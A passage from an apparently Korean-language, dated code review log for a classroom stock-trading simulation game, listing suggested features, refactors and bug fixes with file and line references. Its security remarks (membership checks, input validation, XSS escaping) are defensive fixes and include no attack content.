- **시장 탭 종목 카드에 보유 수량 뱃지 없음** (`app.js:1287-1311`, `app.js:1445-1453`): 학생이 시장 탭을 보면서 이미 보유한 종목인지 파악하려면 모달을 열거나 포트폴리오 탭을 확인해야 함. `execTrade()` 성공 후 `S.tradeHolding`이 갱신되므로 (`app.js:1447-1450`), `S.holdingMap = {}` 상태를 추가해 `openStockModal()` 응답 및 거래 성공 시 갱신, `renderGrid()` 내 `S.holdingMap[st.symbol] > 0`이면 카드 우하단에 `<span class="chip chip-blue">${n}주</span>` 뱃지를 표시하면 서버 추가 요청 없이 구현 가능. 종목이 47개나 되어 보유 여부를 한눈에 파악하기 어려운 학생에게 큰 도움.

- **`loadGuides()`·`loadTips()` 탭 전환 시마다 무조건 재요청** (`app.js:1933, 1956`): `loadGlossary()`는 `if (!S.glossaryData.length)` 가드로 캐시를 활용하지만 (`app.js:1899`), `loadGuides()`와 `loadTips()`는 탭을 전환할 때마다 `/api/education/guides`와 `/api/education/tips`를 재호출함. 교육 콘텐츠는 게임 내내 변하지 않으므로 `S.guidesData`, `S.tipsData` 배열을 State(`app.js:1-24`)에 추가하고 비어 있을 때만 API를 호출하면 학생 30명 × 탭 전환 횟수만큼의 불필요한 요청을 제거할 수 있음.

- **퀴즈 시간 초과 시 패널티 금액을 화면에 표시하지 않음** (`app.js:875-879`, `app.py:1298`): 시간 초과 시 `submitQuiz(null)`가 호출되어 서버에서 `td.penalty`(오답 패널티 금액)를 수신하지만 (`app.py:1298`에서 `penalty`를 반환), 화면에는 "⏰ 시간 초과!" 이모지와 토스트 메시지만 표시하고 결과 카드에 패널티 금액이 표시되지 않음 (`app.js:876-879`). 정답/오답 케이스처럼 `result.innerHTML`에 `<div style="color:var(--down)">-${td.penalty.toLocaleString()}원 차감</div>`를 추가하면 학생이 결과를 명확히 인지 가능.

---

### 제거/단순화할 것들

- **`stopPolling()`에서 복권 폴링 미정리** (`app.js:779-783`): `stopPolling()`은 `clearInterval(S.pollInterval)`, `clearInterval(S._waitingPoll)`, `stopNewsPolling()`을 호출하지만 `_stopLotPolling()`을 호출하지 않음. 결과 화면으로 전환하거나 홈으로 이동해도 `_lotPollInterval`이 살아 남아 5초마다 `/api/rooms/<rid>/lottery` 요청이 계속 발생. `stopPolling()` 함수 본문 마지막에 `_stopLotPolling()` 한 줄을 추가하면 (`app.js:782` 직후) 해결되며, 종료된 방에 대한 불필요한 폴링과 콘솔 에러가 사라짐.

- **`models.py` `datetime.utcnow` Python 3.12 Deprecation** (`models.py:20, 38, 53, 79, 92`): `default=datetime.utcnow`는 Python 3.12에서 `DeprecationWarning: datetime.utcnow() is deprecated and scheduled for removal`를 발생시킴. `default=lambda: datetime.now(timezone.utc)` 패턴으로 일괄 교체 필요. `app.py` 전체에도 `datetime.utcnow()` 직접 호출이 약 15곳 존재 (`app.py:125, 279, 413, 421, 437, 483, 498, 511, 528...`). `from datetime import datetime, timedelta, timezone`은 이미 임포트되어 있으므로 `utcnow()` → `now(timezone.utc)`로 에디터 일괄 치환 가능.

- **`minigame_close()` 내 `Room.query.get(rid)` 폐기 패턴** (`app.py:977`): 이 함수만 `Room.query.get(rid)` (SQLAlchemy Legacy 패턴)을 사용 중이며 나머지 모든 라우트는 `Room.query.get_or_404(rid)`를 씀. SQLAlchemy 2.0으로 마이그레이션 시 해당 행에서만 오류 발생. `db.session.get(Room, rid)`로 교체하면 통일성 확보 및 Legacy API 의존 제거. 이 함수는 Lock 내부에서 호출되므로 세션 상태 주의가 필요하지만 교체 자체는 단순.

- **`_do_reveal()` 내 Room 이중 조회** (`app.py:226, 233`): `_room_lot = db.session.get(Room, rid)` (`app.py:226`)로 조회한 후 `db.session.commit()`, 이후 `room = db.session.get(Room, rid) if _room_lot is None else _room_lot` (`app.py:233`) 로직이 혼란스러움. 226에서 이미 `_room_lot`을 가져왔으므로 `None`이 될 경우는 방이 삭제된 예외 케이스뿐. 226의 조회 결과를 `room`에 직접 할당하고 `if room:` 가드를 쓰면 코드가 명확해지고 DB 왕복 1회 제거 가능.

- **`renderGrid()` 내 인라인 `onclick` 주입 패턴** (`app.js:1293-1310`): `onclick="openStockModal('${st.symbol}')"` 및 `onclick="toggleWatchlist('${st.symbol}',event)"` 형태로 심볼을 HTML 문자열에 직접 삽입. 현재 심볼은 서버에서 정의된 ASCII 문자열이라 안전하지만, 이벤트 핸들러가 카드 수(47개) × 렌더링 횟수만큼 매번 생성됨. `data-symbol` 속성으로 심볼을 저장하고 `stock-grid`에 이벤트 위임 리스너 1개를 등록하면 이벤트 핸들러 생성 오버헤드를 없애고 미래 확장 시 XSS 위험도 차단 가능.

- **`export_rankings()` N+1 쿼리 패턴** (`app.py:1431-1440`): `export_rankings()`도 `member_total_value(rid, m.user_id)` 루프 패턴 (`app.py:1433`)을 그대로 사용해 참여자 수만큼 RoomHolding·Deposit 쿼리를 반복 실행. `host_members()` (`app.py:554`)·`get_rankings()` (`app.py:817`)과 동일한 N+1 문제. 2026-06-11에 `get_rankings()`의 배치 조회 방식을 권고했으나 엑셀 내보내기에는 적용되지 않음. 세 함수에 공통 `batch_total_values(rid)` 헬퍼(단일 쿼리로 전체 보유·예금 합산)를 추출하면 세 곳 동시 해결 가능.

---

## 2026-06-22

### 추가하면 좋을 기능

- **룰렛 전액 베팅 확인 단계 없음** (`app.js:1032`, `doRouletteSpin()`): 슬라이더를 100%로 설정한 후 "룰렛 돌리기" 버튼을 누르면 즉시 전 재산을 베팅한 채 스핀이 실행됨. `setRltPct(100)` 클릭 시 버튼 텍스트를 "⚠️ 전액 베팅 확인" 등으로 바꾸거나, `doRouletteSpin()` 내에서 `rltPct >= 80` 조건이면 `confirm()` 다이얼로그를 띄우는 한 줄 가드(`if (!confirm('전체 자산의 ${rltPct}%를 베팅합니다. 계속하시겠습니까?')) return;`)를 추가하면 학생의 실수 클릭 방지. 특히 모바일에서 슬라이더 오조작이 잦음.

- **진행자가 종료 직전 룰렛 완료 현황 확인 불가** (`app.py:920-936`): 게임이 자동 종료 직전 룰렛 미니게임이 열리는데, 진행자 화면에는 몇 명이 룰렛을 완료했는지 표시되지 않음. `_lots` 딕셔너리와 유사하게 `_rlt_done: dict[int, set] = {}` 를 `app.py:90` 근처에 두고, 참가자가 `/api/rooms/<rid>/minigame/spin` 성공 시 `_rlt_done[rid].add(uid)`로 기록, 진행자용 `/api/rooms/<rid>/status` 또는 `room_dict()` 응답에 `"rlt_done_count"` 필드를 추가하면 "룰렛 완료: 18/24명" 형태로 진행자가 모니터링 가능.

- **상·하한가 종목 시각 표시 없음** (`stock_service.py:139`, `app.js:1287-1311`): `StockService._next_price()`는 `base_price * 0.6` ~ `base_price * 1.4` 범위로 가격을 clamp하므로 상한가·하한가 상태가 실제로 존재함. 그러나 시장 그리드 카드(`renderGrid()`, `app.js:1293`)에는 이를 알리는 표시가 없어 학생이 "왜 더 오르지 않지?"를 이해하기 어려움. `/api/rooms/<rid>/stocks` 응답에 `"at_upper": price >= base*1.39, "at_lower": price <= base*0.61` 플래그를 추가하고 카드에 `<span class="chip chip-red">상한가</span>` / `<span class="chip chip-blue">하한가</span>` 뱃지를 붙이면 교육적 효과가 높아짐.

- **엑셀 내보내기 시 종료 후 재생성된 StockService의 랜덤 가격 반영** (`app.py:1432-1433`, `stock_service.py:317-322`): `_end_room()` (`app.py:120`)은 `cleanup_room_service(rid)`를 호출해 인메모리 StockService를 삭제함. 이후 진행자가 `/api/rooms/<rid>/export`를 호출하면 `member_total_value()` → `get_room_service(rid)` 경로에서 새 StockService가 랜덤 초기 가격으로 생성되어, 실제 종료 시점 가격이 아닌 임의의 가격으로 주식 자산을 계산함. 종료 시점에 심볼별 최종 가격을 `Room` 테이블의 JSON 컬럼(또는 별도 `RoomFinalPrice` 테이블)에 스냅숏으로 저장하고 `export_rankings()`와 `_end_room()` 정산 모두 이 값을 참조하면 정확한 결과 보장.

- **결과 화면에 클래스 전체 활동 통계 없음** (`app.py:1419-1488`): 현재 엑셀 내보내기는 순위·보유 현황만 담음. 학생별 총 거래 횟수, 가장 많이 거래된 종목 Top5, 최대 수익률 종목 등 수업 복기에 유용한 통계가 없음. `RoomTransaction` 테이블 집계(`GROUP BY symbol`, `COUNT(*)`)로 별도 시트를 추가하면 추가 API 없이 엑셀 파일 내에서 수업 마무리 토론 자료가 됨 (`app.py:1460` 이후 `ws2 = wb.add_worksheet(...)` 추가 방식).

- **퀴즈 일시정지 중 접근 가능** (`app.py:1248`, `app.js:832`): 진행자가 게임을 일시정지(`room.status == 'paused'`)해도 퀴즈 FAB 버튼(`index.html:470`)은 계속 보이며 클릭하면 `openQuiz()`가 서버에 `GET /api/rooms/<rid>/quiz`를 요청함. 서버 측 `get_quiz()` (`app.py:1248`)에는 `room.status != 'active'` 가드가 없어 일시정지 중에도 퀴즈가 열림. 서버에서 `if room.status != 'active': return jsonify({'error': 'room not active'}), 400` 한 줄 추가 + 클라이언트에서 FAB를 `room.status === 'active'` 일 때만 표시하면 해결.

### 제거/단순화할 것들

- **`_ending_soon` 인메모리 set → 계산식으로 교체 가능** (`app.py:90`, `app.py:304`): `_ending_soon: set = set()`는 룰렛을 한 번만 트리거하기 위한 플래그인데, Render 재시작 시 초기화되어 재시작 직후 종료 시각이 1분 미만인 방에서 룰렛이 재트리거되는 버그가 있음. `room.rlt_triggered` DB 컬럼이 이미 존재하므로(`models.py:39`) 이 컬럼만으로 중복 방지가 가능. `_ending_soon` set는 제거하고 `room_dict()` (`app.py:304`)의 `ending_soon` 계산식을 `not room.rlt_triggered and room.end_time and (room.end_time - now).total_seconds() <= 60`으로 단순화하면 인메모리 상태 하나 제거.

- **`RoomHolding` 0주 레코드 누적** (`app.py:1037-1040`, `app.py:1318`, `app.py:760`): 룰렛 스핀(`app.py:1037-1040`)과 퀴즈 오답 패널티(`app.py:1304-1326`)에서 보유 주식 강제 처분 시 `h.shares = 0; h.avg_price = 0` 후 `db.session.commit()`만 하고 레코드를 삭제하지 않음. 반면 일반 매도(`app.py:760`)는 `db.session.delete(h)` 후 커밋함. 누적된 0주 레코드는 포트폴리오 조회·랭킹 집계 시 필터링되지 않으면 오답 패널티 이후 종목이 0주로 계속 표시됨. 두 코드 블록 모두 `db.session.delete(h)` 방식으로 통일 필요.

- **`get_room()` 라우트 내 6가지 사이드이펙트 혼재** (`app.py:432-473`): 단일 GET 라우트가 ① 자동 종료 처리, ② 룰렛 트리거, ③ Render 재시작 후 복구, ④ 복권 자동 시작, ⑤ 캐시 무효화, ⑥ 응답 직렬화를 모두 담당. GET 요청에 이런 부작용이 집중되면 폴링 10초마다 의도치 않은 상태 변이가 발생할 수 있음. `_check_and_advance_room(rid)` 헬퍼를 추출해 사이드이펙트를 명시적으로 분리하고, 각 동작에 `if`-early-return 패턴을 적용하면 가독성·테스트 용이성이 높아짐.

- **뉴스 폴링 클라이언트 8초 고정 vs 서버 TTL 불일치** (`app.js:810`, `stock_service.py:167-175`): `startNewsPolling()`은 `setInterval(..., 8000)` 하드코딩, 서버 뉴스 TTL은 `5~300초` 범위에서 종목별로 다름. 서버 응답에 `"next_refresh_in": seconds` 필드를 포함하고 클라이언트가 해당 값을 사용해 다음 폴링 타이머를 설정하면 불필요한 요청을 줄이고 TTL 설정과 실제 동작이 동기화됨. 이는 기존 제안(`2026-06-21(2차)`)의 뉴스 지연 언급보다 구체적인 서버-클라이언트 TTL 동기화 해법.

- **RLT/LOTTO 미니게임 결과가 거래내역에 '조정(ADJ)'으로 표시** (`app.py:839-847`, `app.py:1064-1072`): 룰렛·복권 결과로 현금이 증감할 때 `RoomTransaction` 레코드에 `action='ADJ'`가 기록됨. 이는 진행자 조정(`app.py:839`)과 동일한 액션 타입이어서, 엑셀 내보내기나 거래내역 조회 시 진행자가 직접 조정한 것인지 미니게임 결과인지 구분 불가. `action` 컬럼을 `'RLT'`(룰렛), `'LOT'`(복권)으로 분리하거나 `note` 필드에 출처를 명시하면 감사 추적성 확보. `models.py:74`의 `'BUY / SELL / ADJ'` 주석도 함께 갱신 필요.

---

## 2026-06-22 (2차)

### 추가하면 좋을 기능

- **`StockService._prev` 주기적 갱신으로 뉴스 사이클별 변동률 표시** (`stock_service.py:127`, `stock_service.py:160-164`, `app.py:661`): `_prev` 딕셔너리는 `_init_prices()` 에서 딱 1회만 설정되고 이후 전혀 갱신되지 않음. 60분 게임에서 가격이 +50% 상승한 상태에서 `-5%` 하락해도 학생 화면의 `change_pct`는 시작가 대비 `+42.5%`로 표시되어 "오늘의 변동률" 개념과 완전히 다름. `_maybe_generate_news()` 내 `self._current_biases = self._next_biases.copy()` 직전에 `for sym, (ts, price) in self._prices.items(): self._prev[sym] = price`를 추가하면 뉴스 주기마다 `_prev`가 갱신되어 직전 뉴스 사이클 종가 대비 등락률을 표시하는 의미 있는 변동률 제공 가능.

- **학생용 개인 거래내역 CSV 내보내기** (`app.py:829-847`, `models.py:68-79`): 현재 엑셀 내보내기(`GET /api/rooms/<rid>/export`)는 진행자 전용. 학생이 자신의 거래 내역을 다운로드해 스프레드시트에서 분석하는 교육 활동 불가능. `GET /api/rooms/<rid>/transactions/export` 엔드포인트를 추가해 `RoomTransaction.query.filter_by(room_id=rid, user_id=user.id)`를 Python 내장 `csv` 모듈로 직렬화해 반환하면 openpyxl 없이 20줄로 구현 가능. 게임 후 교사의 "자신의 거래를 정리해 발표해봅시다" 과제와 즉시 연계됨.

- **진행자 화면에 방 내 인기 종목 실시간 순위 패널** (`app.py:540-562`, `index.html:진행자탭`): 진행자가 어떤 종목에 거래가 집중되는지 볼 방법이 없음. `GET /api/rooms/<rid>/host/hot-stocks` 엔드포인트를 추가해 `db.session.query(RoomTransaction.symbol, db.func.count().label('cnt')).filter_by(room_id=rid).group_by(RoomTransaction.symbol).order_by(db.desc('cnt')).limit(5).all()`로 집계 후 반환. 진행자 탭 순위 패널 하단에 "🔥 인기 종목 Top5" 카드로 표시하면 교사가 "지금 여러분 삼성전자에 집중되어 있네요, 이유가 뭘까요?" 형태의 실시간 수업 개입 포인트 확보.

- **퀴즈 답변 전 보상/패널티 금액 사전 표시** (`app.py:1248-1268`, `app.js:849-870`): 현재 퀴즈 오버레이는 질문만 표시하고 맞히면 얼마, 틀리면 얼마인지 보여주지 않음. `GET /api/rooms/<rid>/quiz` 응답에 `reward_amount: max(10000, int(room.starting_cash * reward_pct / 100))`와 `penalty_amount` 필드를 추가하고, 퀴즈 오버레이 하단에 `💰 정답 +XX만원 / ❌ 오답 -XX만원` 한 줄을 표시하면 학생이 리스크 대비 기대값을 계산하며 전략적으로 답변하는 금융 교육 효과 극대화. 서버 3줄, 클라이언트 2줄 추가로 구현 완료.

- **복권 진행자 수동 시작 시 기본 상금 설정 저장** (`app.py:1078-1112`, `index.html:복권모달`): `lottery_start()` 호출마다 진행자가 상금을 매번 직접 입력해야 함. `_quiz_settings[rid]` 패턴을 차용해 `_lottery_default_prize[rid]` 인메모리 딕셔너리를 추가하고, 진행자 설정 탭에 "기본 복권 상금" 입력란 제공. 복권 모달 열 때 `_lottery_default_prize.get(rid, member_count * 30_000_000)` 으로 초기값을 채우면 반복 수업에서 매번 입력하는 번거로움 제거.

- **룰렛 스핀 결과 로컬 히스토리 표시** (`app.js:doRouletteSpin()`, `app.js:1100-1130`): 학생이 룰렛 오버레이에서 다시 spin을 클릭하면 이전 결과가 사라져 "아까 내가 뭘 받았지?" 확인 불가. `S.rltHistory = []` 배열을 `doRouletteSpin()` 성공 시 `S.rltHistory.push({outcome: data.outcome, net: data.net, bet: data.bet})`로 누적하고, 룰렛 오버레이 최하단에 "내 스핀 기록" 섹션으로 최대 3건 표시. 거래내역(`RLT` 액션)과 연결해 복습 가능. 서버 변경 없이 5줄로 구현.

---

### 제거/단순화할 것들

- **`get_quiz()` 룸 멤버십 검증 누락 → 비참여자 퀴즈 상태 소비 가능** (`app.py:1250-1268`): `get_quiz()`는 `@login_required` + `room.status == 'active'` 만 확인하고 `RoomMember.query.filter_by(room_id=rid, user_id=user.id).first()` 체크가 없음. 방에 가입하지 않은 사용자(또는 강퇴된 학생)가 GET으로 퀴즈를 요청하면 `_quiz_state[(rid, uid)]`가 갱신되어 `seen` 집합과 쿨다운이 설정됨. 이후 `submit_quiz()` POST는 `member`가 없으면 현금 변동 없이 응답하지만 서버 상태를 소비. `get_quiz()` 진입부에 `if not RoomMember.query.filter_by(room_id=rid, user_id=user.id).first(): return jsonify({'error': '참여자가 아닙니다.'}), 403` 한 줄 추가로 방어.

- **`create_room()` 숫자 파싱 예외 미처리 → 500 반환** (`app.py:384-386`): `int(d.get('duration_minutes', 30))`, `float(d.get('starting_cash', ...))`, `float(d.get('deposit_rate', ...))` 세 파싱 모두 try/except 없이 사용. 악의적 클라이언트가 `{"duration_minutes": "삼십분"}` 같은 값을 전송하면 `ValueError: invalid literal` → 500 Internal Server Error 반환. 각 필드를 `try/except (TypeError, ValueError): return jsonify({'error': '잘못된 숫자 입력'}), 400` 으로 감싸거나, `d.get('duration_minutes', 30)` 이후 `isinstance` 타입 체크를 선행하면 방어 가능. 같은 패턴이 `host_adjust()` (`app.py:595`), `lottery_start()` (`app.py:1086`), `lottery_skip()` (`app.py:1216`)에도 존재.

- **`lottery_start()` 상금 상한 없음 → 부동소수점 오버플로 위험** (`app.py:1086-1087`): `prize = float(d.get('prize', 0))`에 최대값 검증이 없음. 진행자가 `1e30` 같은 값을 입력하면 당첨 학생의 `m.cash += prize`가 그대로 실행되고 `round(prize / 25)` 등 연산이 부동소수점 `inf`나 비정상 값을 반환할 수 있음. `member_count = RoomMember.query.filter_by(room_id=rid).count()` 이후 `if prize > room.starting_cash * max(member_count, 1) * 100: return jsonify({'error': '상금이 너무 큽니다.'}), 400` 한 줄 추가. 같은 맥락에서 `prize <= 0` 체크(`app.py:1087`) 외에 `math.isfinite(prize)` 가드도 병행 권장.

- **`showBombNews()` `item.headline` HTML 미이스케이프 → 잠재적 XSS** (`app.js:showBombNews()`, `stock_service.py:152, 235, 266`): `content.innerHTML = items.map(item => \`... ${item.headline} ...\`).join('')` 형태로 headline을 직접 삽입. 현재 headline은 `NEWS_TEMPLATES_*` 서버 측 상수에서만 생성되므로 즉각 위험은 없지만, `force_price()` (`stock_service.py:234-235`)와 `force_sector_event()` (`stock_service.py:263-269`)에서 `STOCKS[sym]['name']`·`STOCKS[sym]['sector']` 를 그대로 headline에 삽입하며 이 값들이 미래에 외부 DB 연동 등으로 변경 가능성이 있는 경우 XSS 경로가 열림. 현재 구현 내 `escHtml()` 유틸(`app.js:899`)로 `escHtml(item.headline)` 교체 및 `<br>` 등 허용 태그만 화이트리스트 처리 권장.

- **`openRouletteModal()` minigame/open API 실패 시 게임 영구 일시정지 위험** (`app.js:1142-1150`): `const pr = await api.post(\`/api/rooms/${S.room.id}/minigame/open\`, {}).catch(() => null)` — API 호출 실패 시 `pr = null`로 처리하고 룰렛 모달은 열리지만, 서버의 `_rlt_active[rid].count`는 증가하지 않음. 이후 `closeRoulette()` → `minigame/close` POST는 `state.count <= 0`을 감지해 `return {'ok': True}`를 즉시 반환하며 game resume이 일어나지 않음. 즉 서버는 `paused` 상태인데 룰렛 활성 count는 0이어서 자동 resume 조건 미달. `if (!pr || pr.error) { closeRoulette(); toast('룰렛 서버 연결 오류', 'error'); return; }` 로 실패 시 모달 닫기 처리 필요.

- **`_prev_close` 기반 `change` 필드가 세션 시작가 고정으로 UI에서 혼란 유발** (`app.py:661-669`, `stock_service.py:278-279`): `get_stocks()` 응답의 `change`, `change_pct`는 `prev = svc.get_prev_close(sym)` 즉 게임 시작 초기 가격 대비로 계산됨. 게임 30분 경과 후 가격이 +35% 상승해 있는 상태에서 최근 뉴스로 -2% 하락해도 카드에는 `+31.9% ▲`로 표시. 학생이 "지금 떨어지고 있는데 왜 초록색이지?" 혼란 유발. `_maybe_generate_news()` 내에서 `self._prev` 를 현재 가격으로 스냅숏하거나, 적어도 `get_stocks()` 응답에 `change_from` 필드로 기준 시점을 명시하면 오해 방지.

- **`RoomHolding.avg_price` 음수/0 저장 가능 → 포트폴리오 손익 왜곡** (`app.py:1037-1040`, `app.py:1318-1319`): 룰렛 베팅·퀴즈 패널티에서 보유 주식을 강제 처분할 때 `h.shares = 0; h.avg_price = 0`을 저장하고 `db.session.delete(h)`를 하지 않음 (2026-06-22 기존 분석에서 누락 지적했으나 avg_price=0 파생 문제는 미언급). 이후 `get_portfolio()` 에서 `h.shares <= 0` 조건으로 필터링하면 숨겨지지만, 추후 같은 종목을 재매수하면 `holding.avg_price * holding.shares + amount) / ns` 계산에서 avg_price=0이 사용됨. 0 * 0 = 0이어서 수식 자체는 맞지만 `h.avg_price = 0` 인 레코드와 다음 매수가 합산될 때 `holding.shares = 0`이므로 분모가 `shares`(=0)로 시작해 ZeroDivisionError 가능. `if holding and holding.shares == 0: db.session.delete(holding); holding = None` 처리 후 새로 `RoomHolding` 생성하면 모호성 제거.

---

## 2026-06-24

### 추가하면 좋을 기능

- **QR코드 URL에서 방 코드 자동 채우기** (`app.js:196-205`, `index.html:315-334`): `_makeQR()`이 `${location.origin}${location.pathname}?code=${S.room.code}` URL을 QR에 인코딩하지만, 페이지 로드 시 `?code=` 파라미터를 읽어 `join-code` 입력란에 자동으로 채우는 로직이 없음. 학생이 QR을 스캔해 접속해도 여전히 6자리 코드를 수동 입력해야 해 QR 편의성이 반감됨. `DOMContentLoaded`에서 `const autoCode = new URLSearchParams(location.search).get('code'); if (autoCode) { document.getElementById('join-code').value = autoCode.toUpperCase(); showScreen('screen-join'); }` 10줄 이내 코드로 해결 가능하며, 학생 입장 시간을 단축해 수업 시작을 빠르게 할 수 있음.

- **`api` 래퍼 네트워크 오류 핸들링 없음** (`app.js:29-44`): `api.get/post/del` 세 메서드 모두 `await fetch(url)` 이후 `.ok` 체크만 하고, DNS 실패·타임아웃·연결 거부 등 `fetch()`가 reject될 때는 처리가 없음. Wi-Fi가 불안정한 교실 환경에서 네트워크가 잠깐 끊기면 `Uncaught TypeError: Failed to fetch`가 콘솔에만 출력되고 UI는 아무 피드백 없이 멈춤. `async get(url) { try { const r = await fetch(url); ... } catch(e) { return {error: '네트워크 오류 — 연결을 확인하세요'}; } }` 패턴으로 세 메서드에 try-catch를 추가하면 학생이 오류를 인지하고 재시도할 수 있음.

- **강퇴된 학생의 재입장 방지 없음** (`app.py:564-575`, `app.py:392-406`): `kick_member()`는 `RoomMember` 행만 삭제하고 재입장 금지 처리가 없어, 강퇴당한 학생이 같은 코드로 `join_room()`을 즉시 다시 호출하면 재입장이 허용됨. `Room` 모델에 `kicked_users = db.Column(db.Text, default='')` 컬럼을 추가해 `kick_member()` 시 user_id를 콤마 구분으로 저장하고, `join_room()`에서 `if str(user.id) in (room.kicked_users or '').split(',')` 체크 후 403을 반환하면 됨. 대안으로 `RoomMember`에 `kicked = db.Column(db.Boolean, default=False)` 플래그를 두고 삭제 대신 비활성화하는 방식도 가능.

- **진행자 화면에서 룰렛 진행 상황 알 수 없음** (`app.py:948-963`, `index.html:135-142`): 룰렛 미니게임이 자동 트리거되면 진행자 화면에 "게임 일시정지" 표시 외에 몇 명이 아직 룰렛을 진행 중인지 알 방법이 없음. `_rlt_active[rid]['count']`(현재 미니게임을 열고 있는 학생 수)를 `room_dict()` 에 `rlt_open_count` 필드로 추가하고(`app.py:288-305`), 진행자 게임 화면의 상태바에 "룰렛 진행 중: N명 남음" 텍스트를 표시하면 교사가 모든 학생이 완료할 때까지 기다릴 수 있음. 서버 1줄 + 클라이언트 3줄 이내로 구현 가능.

- **`S.watchlist`가 모든 방/세션에서 공유됨** (`app.js:17`): `new Set(JSON.parse(localStorage.getItem('watchlist') || '[]'))`로 초기화해 학번·방 구분 없이 동일한 관심종목 목록을 사용함. 1학기 게임에서 등록한 종목이 새 학기 새 방에서도 별표가 켜진 채 표시되어 혼란 가능. `S.room`이 확정된 후 `'watchlist-' + S.room.id` 키로 로드/저장하도록 `enterParticipantGame()` 시점에 갱신하면 방별로 독립된 관심종목이 유지됨. `S.watchlist` 초기화는 `app.js:17`에서 일단 비우고(`new Set()`), `enterParticipantGame()` 안에서 `S.watchlist = new Set(JSON.parse(localStorage.getItem('watchlist-' + S.room.id) || '[]'))` 로 갱신하는 패턴 권장.

- **복권·룰렛 결과를 거래 내역 UI에서 식별하기 어려움** (`app.js:522-535`, `index.html:394-403`): 거래 내역 목록에서 `action === 'RLT'`(룰렛) 또는 `symbol === 'LOTTO'`(복권)인 항목은 일반 매수/매도와 같은 스타일로 표시됨. 현재 `txn-badge` 클래스는 `buy`·`sell`·`adj` 세 가지인데 `rlt`와 `lotto` 전용 뱃지(🎰 룰렛, 🎟 복권)를 추가하면 학생이 게임 후 포트폴리오 탭에서 미니게임 수익/손실을 빠르게 파악 가능. CSS 2줄 + 렌더링 조건 분기 1줄로 구현 가능하며, 게임 종료 후 토론에서 "미니게임이 내 순위에 얼마나 영향을 줬나" 교육 토론 자료로 활용 가능.

---

### 제거/단순화할 것들

- **`RoomTransaction` 테이블에 복합 인덱스 없음** (`models.py:68-79`): `RoomTransaction`에 `(room_id, user_id)` 복합 인덱스가 없어, 자주 호출되는 `.filter_by(room_id=rid, user_id=uid)` 패턴(거래 내역 조회, 룰렛 스핀 횟수 카운트 등)이 테이블 전체 스캔을 수행함. 학생 30명이 각 100건 거래하면 3,000행, 복권까지 더하면 더 많아짐. `__table_args__ = (db.Index('ix_txn_room_user', 'room_id', 'user_id'),)` 한 줄을 `RoomTransaction` 클래스에 추가하면 됨. SQLite/PostgreSQL 모두 지원하며 마이그레이션 없이 `db.create_all()`로 생성 가능 (기존 DB에는 `CREATE INDEX IF NOT EXISTS ix_txn_room_user ON room_transactions(room_id, user_id)` 실행 필요).

- **자산 청산 로직이 `minigame_spin()`과 `submit_quiz()`에서 35줄씩 중복** (`app.py:1022-1057`, `app.py:1302-1338`): 현금 부족 시 ① 보유 주식을 가치 높은 순으로 매각 → ② 남은 부족분을 예금 인출로 충당하는 로직이 거의 동일하게 두 곳에 복사되어 있음. `_liquidate_for_amount(rid, uid, member, shortfall, note_prefix)` 헬퍼 함수로 추출하면 코드 70줄이 함수 1개 + 호출 2줄로 압축됨. 향후 세금·벌금·이벤트 같은 차감 기능 추가 시에도 동일 헬퍼를 재사용 가능.

- **`_rlt_active` 딕셔너리가 서버 재시작 후 소실되어 룰렛 미완료 상태 복구 불가** (`app.py:252`, `app.py:466-468`): `_lots`(복권)은 `room.lottery_rounds_done` DB 컬럼으로 완료 회차를 복구하지만(`app.py:174-178`), `_rlt_active`는 별도 복구 로직이 없음. `room.rlt_triggered == True && room.status == 'paused'`인 방은 `app.py:467-468`에서 `_rlt_active[rid]`를 재초기화하지만 `count`가 항상 0으로 복구됨. Render 재시작 후 룰렛 진행 중이던 학생들의 클로즈 요청이 `count == 0`을 감지해 게임을 바로 종료하거나 영구 일시정지 상태에 빠질 수 있음. 단기 해결책: 재시작 복구 시 `count`를 0 대신 `RoomMember` 수로 초기화하고, 각 `minigame/close` 호출에서 count를 감소시키도록 현재 로직을 유지.

- **QR코드 색상 반전으로 구형 스캐너에서 인식 실패 가능** (`app.js:200-205`): `colorDark: '#e6edf3'` (밝음), `colorLight: '#0d1117'` (어두움)으로 설정되어 표준 QR코드의 흑백 배치가 뒤집혀 있음. QR코드 표준(ISO/IEC 18004)은 어두운 모듈이 밝은 배경 위에 있어야 함을 권장하며, 구형 Android 카메라 앱이나 일부 교실 태블릿에서 반전 QR 인식 실패 사례가 있음. `colorDark: '#000000'`, `colorLight: '#FFFFFF'`로 변경하고 QR 컨테이너에 `padding: 8px; background: #fff; border-radius: 8px` 인라인 스타일을 추가하면 호환성 문제 없이 다크 테마에서도 자연스럽게 표시됨 (`app.js:200-205`, `index.html:93`, `index.html:657`).

- **`_get_room_cached()` 캐시 히트 시 불필요한 딕셔너리 전체 복사** (`app.py:51-64`): `d = dict(entry['data'])`로 캐시 데이터 전체를 복사한 뒤 `d['is_host'] = uid == room.host_id` 한 줄을 추가함. `is_host`는 `room.host_id == uid` 비교이므로 캐시에 `host_id`를 저장하고, 조회 시 `data = dict(entry['data']); data['is_host'] = (uid == data['host_id'])` 로 변경하면 코드 의도가 더 명확해짐. 더 나아가 참조 공유로 인한 캐시 오염을 방지하려면 `copy.copy()` 대신 필요한 필드만 새 딕셔너리로 조립하는 방식이 안전함 (`app.py:55-59`).

- **`get_room()` 라우트에서 `_auto_start_lottery_if_due()` 호출이 모든 멤버 폴링마다 실행됨** (`app.py:470`, `app.py:408-430`): 참여자 30명이 10초마다 `GET /api/rooms/<rid>` 폴링 → 30개 동시 요청 → `_auto_start_lottery_if_due()` 30번 호출. 내부에 `_lottery_lock`이 있어 중복 실행을 방지하지만, 잠금 획득 전에도 `room.status != 'active'` 체크 이후 `_lot_round_due()` 계산이 매번 수행됨. 복권 자동 시작 조건은 `_room_cache`가 만료될 때(1.5초 TTL) 한 번만 확인하면 충분하므로, `_auto_start_lottery_if_due()` 호출을 캐시 미스 경로에만 두거나, `_lot_round_due()` 결과도 캐시하면 30 × 초당 0.67회 = 초당 20회의 중복 계산을 제거할 수 있음.

---

## 2026-06-24 (2차)

### 추가하면 좋을 기능

